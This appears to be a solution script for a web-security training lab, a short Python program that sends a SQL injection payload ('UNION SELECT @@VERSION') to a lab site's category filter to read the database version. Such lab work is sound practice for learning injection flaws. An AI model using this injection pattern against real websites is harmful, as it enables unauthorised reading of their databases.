import requests

site = "ac3c1fc91e70143ec06d1dc900b20042.web-security-academy.net"

if __name__ == "__main__":
    def try_category(category_string):
        url = f'https://{site}/filter?category={category_string}'
        resp = s.get(url)
        print(resp.text)


    s = requests.Session()
    try_category("""Lifestyle' UNION SELECT @@VERSION,null; -- """)
